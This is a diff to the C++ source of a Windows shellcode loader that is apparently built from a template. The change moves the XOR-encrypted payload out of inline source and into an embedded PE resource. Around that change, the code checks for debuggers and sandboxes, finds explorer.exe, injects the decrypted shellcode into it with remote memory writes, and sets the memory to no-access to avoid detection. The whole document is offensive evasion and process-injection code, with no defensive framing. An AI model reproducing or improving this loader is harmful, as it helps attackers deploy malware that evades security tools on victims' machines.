@@ -5,12 +5,9 @@
 #include <iostream>
 #include <TlHelp32.h>
 #include "helper.h"
+#include "shellcode.h"
+#include "resource.h"
 
-<SHELLCODE>
-
-char key[] = <XOR_KEY>;
-unsigned int key_len = sizeof(key);
-unsigned int shellcode_len = sizeof(shellcode);
 
 
 void zero_memory(unsigned char data[], int dataLen)
@@ -43,12 +40,23 @@ int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
     VIRTUALPROTECTEX virtualProtectEx;
     CREATEREMOTETHREAD createRemoteThread;
     RESUMETHREAD resumeThread;
+	VIRTUALALLOC virtualAlloc;
 
 	// Anti debug check
     antiDebug();
 
 	// Anti sandbox check
     antiSandbox();
+
+	HRSRC shellcodeRes = FindResource(NULL, MAKEINTRESOURCE(IDR_BINARY1), L"binary");
+	DWORD shellcode_len = SizeofResource(NULL, shellcodeRes);
+	if (!shellcode_len)
+	{
+			return 0;
+	}
+	HGLOBAL shellcodeResourceData = LoadResource(NULL, shellcodeRes);
+
+	void* shellcodeSource = LockResource(shellcodeResourceData);
 
     <LOAD_FUNCTIONS>
 
@@ -58,6 +66,8 @@ int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
 	PROCESS_INFORMATION pi;
 	SIZE_T attributeSize;
 	ZeroMemory(&si, sizeof(STARTUPINFOEXA));
+	void* shellcode = virtualAlloc(0, shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	memcpy(shellcode, shellcodeSource, shellcode_len);
 
     // Grab the PID for explorer.exe and get a handle to the process
     DWORD targetPid = getPidByName(L"explorer.exe");
@@ -79,7 +89,7 @@ int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
 
 
 	// XOR shellcode
-	xor_data(shellcode, shellcode_len, key, key_len);
+	xor_data((unsigned char *)shellcode, shellcode_len, key, key_len);
 	// Allocate memory to write payload into memory
     //	payloadPtr = VirtualAlloc(0, shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
@@ -89,7 +99,7 @@ int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
 	//RtlMoveMemory(payloadPtr, shellcode.data, sz);
 	writeProcessMemory(ph, payloadPtr, shellcode, shellcode_len, NULL);
 	//zero_memory(shellcode, shellcode_len);
-    xor_data(shellcode, shellcode_len, key, key_len);
+    xor_data((unsigned char *)shellcode, shellcode_len, key, key_len);
 
 	// Change memory permissions to PAGE_NO_ACCESS
 	virtualProtectEx(ph, payloadPtr, shellcode_len, PAGE_NOACCESS, &oldProtect);
